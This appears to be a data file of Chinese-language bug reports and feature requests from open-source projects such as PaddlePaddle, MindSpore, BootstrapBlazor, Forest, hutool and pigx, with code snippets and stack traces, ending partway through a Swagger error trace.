Layout 设置 UseTabSet=“true” 时能不能暴露Tabs的IsOnlyRenderActiveTab属性？,有时需要Tabs切换页面时直接刷新页面，不想保持原有的状态，能否把IsOnlyRenderActiveTab属性暴露出来可以在 Layout 属性中进行设置？ 目前的Tabs 模式下 一个页面单独写的 html css样式切换到其他页面时有也会生效。 我在【平台列表】razor页面中添加了css样式，在【用户管理】razor页面中没有添加，来回切换tabs页面时，会相互影响，看下图   <code>: .float-start { float: right !important; margin-left: .3125rem }
激活函数遇到nan时应该输出nan,"PaddlePaddle Version: 2.0.0-rc1 CPU/GPU: CUDA 10.2; cuDNN: 7.4 系统：Linux ubuntu 4.4.0-131-generic #157:Will you provide the matlab API?-Ubuntu SMP Thu Jul 12 15:51:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 复现：下面是Paddle的代码： 输出是： 下面是Torch的代码(version: 1.6.0)： 输出是 我在训练的过程中不知道为什么模型的参数变成了nan，但输出的预测值不是nan，这样很难让人发现中间出错了。   <code>: import paddle import numpy as np x = paddle.to_tensor([ [-1. ,np.nan], [np.nan, 15.6] ]) out = paddle.nn.ELU()(x) print(out) Tensor(shape=[2, 2], dtype=float32, place=CUDAPlace(0), stop_gradient=True, [[-0.63212055, 0. ], [ 0. , 15.60000038]]) import torch as t import numpy as np x = t.tensor([ [-1. ,np.nan], [np.nan, 15.6] ]) out = torch.nn. ELU()( x ) print(out) tensor([[-0.6321, nan], [ nan, 15.6000]])"
@BodyType指定json请求体远程调用报错,"Forest: version Backend: (okhttp或httpclient)/version 该问题是如何引起的？ @BodyType 指定json格式请求体，远程调用http://localhost:8020/api/v1/user插入用户方法，报错 说是类型转换问题 报错信息/完整请求日志（如果没有请求日志请把开关打开） { ""timestamp"": ""2022-03-24T05:30:43.002+00:00"", ""status"": 500, ""error"": ""Internal Server Error"", ""trace"": ""com.dtflys.forest.exceptions.ForestNetworkException: HTTP 415 ErrorContent={""timestamp"":""2022-03-24T05:30:42.985+00:00"",""status"":415,""error"":""Unsupported Media Type"",""path"":""/api/v1/user""}\r\n\tat com.dtflys.forest.reflection.MethodLifeCycleHandler.handleError(MethodLifeCycleHandler.java:136)\r\n\tat com.dtflys.forest.reflection.MethodLifeCycleHandler.handleSyncWithException(MethodLifeCycleHandler.java:66)\r\n\tat com.dtflys.forest.reflection.MethodLifeCycleHandler.handleSync(MethodLifeCycleHandler.java:51)\r\n\tat com.dtflys.forest.backend.ResponseHandler.handleSync(ResponseHandler.java:39)\r\n\tat com.dtflys.forest.backend.okhttp3.response.OkHttp3ResponseHandler.handleSync(OkHttp3ResponseHandler.java:29)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.retryOrDoError(OkHttp3Executor.java:253)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:230)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:224)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:224)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:224)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:266)\r\n\tat com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:4077)\r\n\tat com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:4111)\r\n\tat com.dtflys.forest.reflection.ForestMethod.invoke(ForestMethod.java:1414)\r\n\tat com.dtflys.forest.proxy.InterfaceProxyHandler.invoke(InterfaceProxyHandler.java:215)\r\n\tat com.sun.proxy.$Proxy91.bodyTypeJson(Unknown Source)\r\n\tat com.ediansoft.forest.controller.ForestController.bodyTypeJson(ForestController.java:95)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:566)\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)\r\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963)\r\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)\r\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:517)\r\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:584)\r\n\tat io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129)\r\n\tat org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84)\r\n\tat io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62)\r\n\tat io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68)\r\n\tat io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36)\r\n\tat io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68)\r\n\tat io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117)\r\n\tat io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46)\r\n\tat io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64)\r\n\tat io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60)\r\n\tat io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77)\r\n\tat io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131)\r\n\tat io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48)\r\n\tat io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100)\r\n\tat io.undertow.server.Connectors.executeRootHandler(Connectors.java:387)\r\n\tat io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852)\r\n\tat org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35)\r\n\tat org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019)\r\n\tat org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558)\r\n\tat org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1423)\r\n\tat org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280)\r\n\tat java.base/java.lang.Thread.run(Thread.java:834)\r\n"", ""message"": ""Request processing failed; nested exception is com.dtflys.forest.exceptions.ForestNetworkException: HTTP 415 ErrorContent={""timestamp"":""2022-03-24T05:30:42.985+00:00"",""status"":415,""error"":""Unsupported Media Type"",""path"":""/api/v1/user""}"", ""path"": ""/forest/bodyTypeJson"" } 接口定义（必要时请提供）   <code>: /** * @BodyType 不设置 Content-Type, 也可以指定 JSON 格式请求体，优先级高于Content-Type */ @BodyType(""json"") @Post(url = ""/api/v1/user"") List&lt;User&gt; bodyTypeJson(@Body(""id"") Integer id, @Body(""name"") String name, @Body(""age"") Integer age); /** * 插入用户 * http://localhost:8020/api/v1/user */ @PostMapping public ResponseBean&lt;String&gt; save(@RequestBody User user) { String userStr = JSON.toJSONString(user); log.info(""RestFulController save ------------------"" + userStr); return new ResponseBean&lt;&gt;(200); }"
Follow the environment variable when checking CUDA version,": /device gpu /device cpu : -- MindSpore version : 1.0.0 binary -- Python version : 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : Install different version of CUDA in one machine, set PATH, LD_LIBRARY_PATH and CUDA_HOME to the version expected, in this case, CUDA 10.1 run Raising the following error: The behavior in , assuming that the using CUDA must be installed at , is too simple. Moreover, it assumes that if you are using custom CUDA path , then should not contain , which is incredible. When some (magic) environment variable is set, like , it's better to respect it instead of just ignoring it as .   <code>: python -c ""import mindspore"" OSError: MindSpore version 1.0.0 and cuda version 10.2 does not match, reference to the match info on: https://www.mindspore.cn/install GPUEnvChecker /usr/local/cuda /usr/local/cuda version.txt CUDA_HOME GPUEnvChecker"
crud:before-close回调无法阻止dialogCloseBtn关闭对话框,"crud组件before-close回调方法，无法阻止点击dialogCloseBtn（对话框右上角关闭按钮）关闭对话框 代码   <code>: &lt;avue-crud ...... :before-close=""handelBeforeClose""&gt; &lt;/avue-crud&gt; ...... methods: { handelBeforeClose(done, type) {}, ...... }"
静态图模式训练报错：RuntimeError: ({'errCode': 'E64002''),"运行自己搭建的网络在在会报错，具体报错如下： 主要的报错信息有两个： 系统信息： MindSpore版本： 在GPU环境下，同样的代码，只修改 ,是可以成功训练完成，并成功预测的。 然后我看到之前有一个类似的PR： 图模式报错 E64002 和 28060 fix shared valuenode bug in Conv2DUnifyMindIR pass 请问：如果环境受限，无法升级更高的版本，是否可以从代码层面避免这个问题，一般需要从哪个地方查起，谢谢。   <code>: device_target = 'Ascend' --------------------------------------------------------------------------- RuntimeError Traceback (most recent call last) &lt;ipython-input-15-61258ecd7462&gt; in &lt;module&gt; ----&gt; 1 train_net(model, epoch_size, mnist_path, repeat_size, ckpoint_cb, dataset_sink_mode) &lt;ipython-input-12-3be65215e302&gt; in train_net(model, epoch_size, mnist_path, repeat_size, ckpoint_cb, sink_mode) 4 # load training dataset 5 ds_train = create_dataset(os.path.join(mnist_path, ""train""), 16, repeat_size) ----&gt; 6 model.train(epoch_size, ds_train, callbacks=[ckpoint_cb, LossMonitor()], dataset_sink_mode=sink_mode) 7 8 ~/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/train/model.py in train(self, epoch, train_dataset, callbacks, dataset_sink_mode, sink_size) 724 callbacks=callbacks, 725 dataset_sink_mode=dataset_sink_mode, --&gt; 726 sink_size=sink_size) 727 728 def build(self, train_dataset=None, valid_dataset=None, sink_size=-1, epoch=1): ~/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/train/model.py in _train(self, epoch, train_dataset, callbacks, dataset_sink_mode, sink_size) 502 self._train_process(epoch, train_dataset, list_callback, cb_params) 503 else: --&gt; 504 self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) 505 506 @staticmethod ~/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/train/model.py in _train_dataset_sink_process(self, epoch, train_dataset, list_callback, cb_params, sink_size) 564 cb_params.train_dataset_element = inputs 565 list_callback.step_begin(run_context) --&gt; 566 outputs = self._train_network(*inputs) 567 if is_graph: 568 cb_params.cur_step_num += dataset_helper.sink_size() ~/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/nn/cell.py in __call__(self, *inputs, **kwargs) 402 if self.enable_hook: 403 raise ValueError(""The graph mode does not support hook function."") --&gt; 404 out = self.compile_and_run(*inputs) 405 return out 406 ~/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/nn/cell.py in compile_and_run(self, *inputs) 680 """""" 681 self._auto_parallel_compile_and_run = True --&gt; 682 self.compile(*inputs) 683 684 new_inputs = [] ~/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/nn/cell.py in compile(self, *inputs) 667 inputs (tuple): Inputs of the Cell object. 668 """""" --&gt; 669 _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) 670 671 def compile_and_run(self, *inputs): ~/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/common/api.py in compile(self, obj, phase, do_convert, auto_parallel_mode, *args) 546 enable_ge = context.get_context(""enable_ge"") 547 use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) --&gt; 548 result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) 549 self.compile_cache[phase] = phase 550 if not result: RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/ascend_kernel_compile.cc:384 ParseTargetJobStatus] Single op compile failed, op: conv2d_backprop_filter_d_15404783520523291174_0 except_msg : 2022-05-30 10:23:18.600515: Query except_msg:Traceback (most recent call last): File ""/usr/local/Ascend/nnae/latest/fwkacllib/python/site-packages/te_fusion/parallel_compilation.py"", line 1497, in run master_pid=self._master_pid) File ""/usr/local/Ascend/nnae/latest/fwkacllib/python/site-packages/te_fusion/fusion_manager.py"", line 1283, in build_single_op compile_info = call_op() File ""/usr/local/Ascend/nnae/latest/fwkacllib/python/site-packages/te_fusion/fusion_manager.py"", line 1271, in call_op opfunc(*inputs, *outputs, *new_attrs, **kwargs) File ""/usr/local/Ascend/nnae/latest/fwkacllib/python/site-packages/tbe/common/utils/para_check.py"", line 545, in _in_wrapper return func(*args, **kwargs) File ""/usr/local/Ascend/nnae/latest/opp/op_impl/built-in/ai_core/tbe/impl/conv2d_backprop_filter_d.py"", line 582, in conv2d_backprop_filter_d data_format) File ""/usr/local/Ascend/nnae/latest/opp/op_impl/built-in/ai_core/tbe/impl/conv2d_backprop_filter_d.py"", line 468, in _check_shape_and_format _check_inputs_rules() File ""/usr/local/Ascend/nnae/latest/opp/op_impl/built-in/ai_core/tbe/impl/conv2d_backprop_filter_d.py"", line 418, in _check_inputs_rules raise RuntimeError(dict_args, error_manager.get_error_message(dict_args)) RuntimeError: ({'errCode': 'E64002', 'param1': 'filter_size', 'param2': 'ori_shape of y', 'actual_value': '[1, 32, 7, 7], [32, 1, 7, 7]'}, 'In op, [filter_size] must be equal to [ori_shape of y], while the input of them are [[1, 32, 7, 7], [32, 1, 7, 7]]') node trace: In file /home/ma-user/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/ops/_grad/grad_nn_ops.py(71)/ dw = filter_grad(dout, x, w_shape)/ Corresponding forward node candidate: In file /home/ma-user/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/nn/layer/conv.py(266)/ output = self.conv2d(x, self.weight)/ In file &lt;ipython-input-6-15cb63c662e1&gt;(153)/ In file &lt;ipython-input-7-09dfc33b9701&gt;(46)/ In file &lt;ipython-input-7-09dfc33b9701&gt;(65)/ In file /home/ma-user/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py(110)/ out = self._backbone(data)/ In file /home/ma-user/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py(353)/ loss = self.network(*inputs)/ In file /home/ma-user/anaconda3/envs/MindSpore-1.5.1-aarch64/lib/python3.7/site-packages/mindspore/train/dataset_helper.py(79)/ return self.network(*outputs)/ # RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/ascend_kernel_compile.cc:384 ParseTargetJobStatus] Single op compile failed, op: conv2d_backprop_filter_d_15404783520523291174_0 RuntimeError: ({'errCode': 'E64002', 'param1': 'filter_size', 'param2': 'ori_shape of y', 'actual_value': '[1, 32, 7, 7], [32, 1, 7, 7]'}, 'In op, [filter_size] must be equal to [ori_shape of y], while the input of them are [[1, 32, 7, 7], [32, 1, 7, 7]]') Linux notebook-32d9fa25-cfb2-4a76-9a32-b0980204a754 4.19.36-vhulk1907.1.0.h619.eulerosv2r8.aarch64 #1 SMP Mon Jul 22 00:00:00 UTC 2019 aarch64 aarch64 aarch64 GNU/Linux MindSpore version: 1.5.1 device_target = 'GPU'"
use_shared_memory=False报错,"1）PaddlePaddle版本：Paddle2.1.0 2）CPU：AIStudio 3）GPU：AIStudio提供的V100 4）Python：3.7 1）单机，单卡   <code>: Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/queues.py"", line 236, in _feed obj = _ForkingPickler.dumps(obj) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/multiprocessing/reduction.py"", line 51, in dumps cls(buf, protocol).dump(obj) TypeError: can't pickle Tensor objects"
SelectedRows 赋值问题,BootstrapBlazor/src/BootstrapBlazor/Components/Table/Table.razor.Edit.cs SelectedRows = SelectedItems; 不应该放到HasDelegate中吧!   <code>: private async Task OnSelectedRowsChanged() { if (SelectedRowsChanged.HasDelegate) { SelectedRows = SelectedItems; await SelectedRowsChanged.InvokeAsync(SelectedRows); } }
DatePicker 点击后不会更新选择的日期,"版本：1.2.9 可以正确初始化，但是日期组件不会高亮显示当前日期，而且点击日期后，v-model 绑定的值不会发生变化 查看 src/component/datePicker/index.vue 354 行附近有这样一个片段： 似乎不管怎么点击，最后的值还是会被赋为最开始传进来的日期   <code>: // 计算结果日期 const dateValue = computed&lt;string&gt;(() =&gt; { currentDay.value = new Date(props.modelValue).getTime(); // 问题所在行 if (currentDay.value === -1) { $emits(""update:modelValue"", """"); return """"; }"
【众智】【计算-AICPU开发】MedianGrad,AICPU算子接入 算子Median的反向算子。 接口目录：mindspore/ops/operations/_grad_ops.py y_grad x y indices 可选输入 x_grad global_median bool 必选属性 axis int 可选属性 keepdim bool 可选属性 对应底层算子 对应底层AICPU算子MedianGrad 无需实现反向算子。   <code>: class MedianGrad(Primitive):
fix_上传版块图标后台丢失ALT,"默认板块图标是有ALT，但是上传图标后的图片就没有ALT的 upload/source/function/function_forumlist.php 替换为：   <code>: $forum['icon'] = '&lt;a href=""forum.php?mod=forumdisplay&amp;fid='.$forum['fid'].'""&gt;&lt;img src=""'.$forum['icon'].'"" align=""left"" alt="""" /&gt;&lt;/a&gt;'; $forum['icon'] = '&lt;a href=""forum.php?mod=forumdisplay&amp;fid='.$forum['fid'].'""&gt;&lt;img src=""'.$forum['icon'].'"" align=""left"" alt=""'.$forum['name'].'"" /&gt;&lt;/a&gt;';"
http 调用vmtool命令无法获取正确输出,"http方式执行vmtool命令，无法获取期望的输出结果。   <code>: { ""body"": { ""command"": ""vmtool --action getInstances --className java.lang.String"", ""jobId"": 7, ""jobStatus"": ""TERMINATED"", ""results"": [ { ""jobId"": 7, ""statusCode"": 0, ""type"": ""status"" } ], ""timeExpired"": false }, ""sessionId"": ""bfff66ee-fe79-4093-b251-347c39768804"", ""state"": ""SUCCEEDED"" }"
使用sqlserver 存储过程提示  解析失败或数据为空,"版本号： v1.5.0-beta 使用sqlserver 2012, 写了两个存储过程, 一个可以成功读取列表, 一个提示&lt;解析失败或数据为空&gt;, 对比后发现只要存储过程中使用到了create,insert关键字就会失败. 下面是失败的存储过程以及贴图 提示错误的存储过程 积木报表是一款免费报表产品，功能免费源码不开放;   <code>: &gt; ALTER PROCEDURE [dbo].[P_采集数据_横向_表头] &gt; &gt; AS &gt; &gt; BEGIN &gt; &gt; -- 初始化开始和结束时间 &gt; DECLARE @dayTimeBegin datetime &gt; DECLARE @dayTimeEnd datetime &gt; &gt; &gt; SELECT @dayTimeBegin=F_DayTimeBegin,@dayTimeEnd=F_DayTimeEnd FROM dbo.T_EMS_DateBase &gt; &gt; &gt; -- 创建临时表用于存储结果 &gt; create table #temp( &gt; group_name VARCHAR(100), &gt; group_value int, &gt; time_begin datetime, &gt; time_end datetime &gt; ) &gt; -- Select CONVERT(varchar(100), @dayTimeBegin, 8),CONVERT(varchar(100), @dayTimeEnd, 8) &gt; &gt; &gt; -- 构建参数 &gt; DECLARE @group_name VARCHAR(100) &gt; DECLARE @group_value int &gt; DECLARE @time_begin datetime &gt; DECLARE @time_end datetime &gt; DECLARE @temp_time datetime &gt; &gt; SET @temp_time=@dayTimeBegin &gt; SET @group_value=-1 &gt; &gt; -- IF @dayTimeBegin = @dayTimeEnd or @dayTimeBegin &gt; @dayTimeEnd &gt; BEGIN &gt; WHILE (CONVERT(varchar(10), @temp_time, 108) != CONVERT(varchar(10), @dayTimeEnd, 108) or @group_value=-1) and @group_value&lt;30 &gt; BEGIN &gt; &gt; SET @time_begin=@temp_time &gt; SET @time_end=DATEADD(hour,1,@temp_time) &gt; SET @temp_time=@time_end &gt; SET @group_value=@group_value+1 &gt; &gt; INSERT INTO #temp ( &gt; group_name, &gt; group_value, &gt; time_begin, &gt; time_end &gt; ) &gt; VALUES &gt; ( &gt; CONVERT(varchar(10), @time_begin, 108)+'-'+CONVERT(varchar(10), @time_end, 108), &gt; @group_value, &gt; @time_begin, &gt; @time_end &gt; ) &gt; END &gt; END &gt; &gt; &gt; select * from #temp &gt; END"
[ST][MS][NET][bert/transformer][910 1p/8p]FPS[5549] can not reach 7000,"bert网络在910环境训练，transformer、bert-base、bert-large 1p&amp;8p性能劣化 / 硬件环境: /device ascend : -- MindSpore version :r1.10.0 commit_id:1d04c8f8 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221123075823 r1.10 commit_id:1d04c8f8 (/): /mode pynative /mode graph test_ms_bert_base_cn_news_train_check_loss_910_8p_0001.py test_ms_bert_base_cn_news_train_check_perf_910_1p_0002.py test_ms_bert_large_cn_news_train_check_loss_910_8p_0001.py test_ms_bert_large_cn_news_train_check_perf_910_1p_0002.py cd solution_test/cases/02network/02nlp/bert/train pytest -s test_ms_bert_base_cn_news_train_check_loss_910_8p_0001.py 网络训练成功，性能达标 走给何茂华   <code>: Train epoch time: 201873.540 ms, per step time: 2018.735 ms Train epoch time: 36885.795 ms, per step time: 368.858 ms Train epoch time: 36908.540 ms, per step time: 369.085 ms Train epoch time: 36916.575 ms, per step time: 369.166 ms Train epoch time: 36918.441 ms, per step time: 369.184 ms Train epoch time: 36905.886 ms, per step time: 369.059 ms Train epoch time: 36919.318 ms, per step time: 369.193 ms Train epoch time: 36901.456 ms, per step time: 369.015 ms Train epoch time: 36893.966 ms, per step time: 368.940 ms Train epoch time: 36903.432 ms, per step time: 369.034 ms"
FileUtil.appendLines的一点疑问,"JDK版本： openjdk_8_201 hutool版本： 5.7.17 执行前文件内容 既然是追加行，为什么不新起一行，而且最后会追加一个空行呢？   <code>: // test.txt中内容为abc // 单行 File file = FileUtil.file(""test.txt""); // 模拟数据并追加 List&lt;String&gt; list = ListUtil.toList(""a"", ""b"", ""c""); FileUtil.appendLines(list, file, StandardCharsets.UTF_8);"
谷歌浏览器访问swagger-ui.html upms后台报错,"pigx版本: 2.5.1 操作系统:win10 是否修改包名: 没有修改 2019-03-20 09:02:38.633 WARN 17976 --- [ XNIO-1 task-1] i.s.m.p.AbstractSerializableParameter : Illegal DefaultValue for parameter type integer java.lang.NumberFormatException: For input string: """" at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.lang.Long.parseLong(Long.java:601) at java.lang.Long.valueOf(Long.java:803) at io.swagger.models.parameters.AbstractSerializableParameter.getExample(AbstractSerializableParameter.java:412) at sun.reflect.GeneratedMethodAccessor159.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:688) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:719) at 